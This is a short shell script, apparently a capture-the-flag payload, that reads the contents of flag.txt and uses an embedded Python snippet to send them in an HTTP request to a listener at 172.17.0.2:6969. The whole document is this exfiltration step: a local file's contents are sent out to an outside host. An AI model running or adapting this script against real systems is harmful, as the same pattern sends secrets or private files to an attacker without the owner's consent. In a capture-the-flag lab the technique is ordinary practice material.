#!/bin/sh
FLAG=$(tr -d '\n' < flag.txt)
python3 - <<EOF
import urllib.request
urllib.request.urlopen("http://172.17.0.2:6969/flag?=$FLAG")
EOF

